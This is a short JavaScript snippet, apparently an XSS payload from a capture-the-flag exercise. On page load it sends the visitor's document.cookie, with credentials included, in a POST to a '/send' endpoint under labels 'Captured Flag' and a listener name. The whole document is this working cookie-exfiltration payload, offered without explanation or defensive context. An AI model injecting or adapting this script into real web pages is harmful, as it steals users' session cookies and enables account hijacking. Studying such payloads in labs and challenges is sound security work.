document.addEventListener('DOMContentLoaded', function () {
    fetch('/send', {
        method: 'POST', credentials: 'include', headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        , body: 'header=Captured+Flag&listener=mahiro_zcy&content=' + document.cookie
    }).then(response => response.text()).then(data => console.log(data)).catch(error => console.error('Error:', error));
});